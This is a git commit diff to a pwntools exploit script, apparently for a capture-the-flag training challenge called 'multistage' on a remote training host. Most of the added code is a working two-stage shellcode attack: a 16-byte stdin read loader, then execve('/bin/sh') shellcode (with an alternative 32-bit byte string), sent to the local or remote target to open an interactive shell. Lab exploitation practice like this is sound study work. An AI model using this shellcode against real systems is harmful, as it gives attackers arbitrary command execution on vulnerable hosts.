3579142d7ca3cdbb7f11f5a4096ce5fbcb08e1cc
Khalil El Hage Kassem <90007227+Khalil002@users.noreply.github.com>
2025-10-01 00:24:15 +0200

    Update e.py

--- c3/e.py
+++ c3/e.py
@@ -1,21 +1,51 @@
 from pwn import *
 
+from pwn import *
+
 COMMANDS = """
 xuntil 0x40123f
 """
-shellcode = b"\x6A\x3B\x58\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x54\x5F"
 
+# First stage: 16-byte loader that reads more shellcode from stdin
+# sys_read(0, current_address, large_size)
+stage1 = asm('''
+    xor rax, rax      ; syscall 0 = read
+    xor rdi, rdi      ; fd = 0 (stdin)
+    mov rsi, rsp      ; buf = current stack position
+    mov dx, 0x1000    ; count = 4096 bytes
+    syscall
+    jmp rsi           ; jump to the new shellcode
+''')
 
+# Second stage: actual execve("/bin/sh", 0, 0) shellcode
+stage2 = asm('''
+    mov rax, 59
+    lea rdi, [rip+binsh]
+    xor rsi, rsi
+    xor rdx, rdx
+    syscall
+binsh:
+    .string "/bin/sh"
+''')
 
+# Alternative shorter stage2 (23 bytes)
+stage2_alt = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 
-#ncat --ssl back-to-shell.training.offensivedefensive.it 8080
+context.arch = 'amd64'
+
 if args.GDB:
-    p = gdb.debug("./multistage" , gdbscript=COMMANDS)
+    p = gdb.debug("./multistage", gdbscript=COMMANDS)
 elif args.REMOTE:
     p = remote("multistage.training.offensivedefensive.it", 8080, ssl=True)
 else:
     p = process("./multistage")
-p.send(shellcode)
+
+# Send first stage loader
+p.send(stage1.ljust(16, b'\x90'))  # Pad to 16 bytes with NOPs
+
+# Send second stage execve shellcode
+p.send(stage2)
+
 p.interactive()
 
 #execve("/bin/sh\0", NULL, NULL)
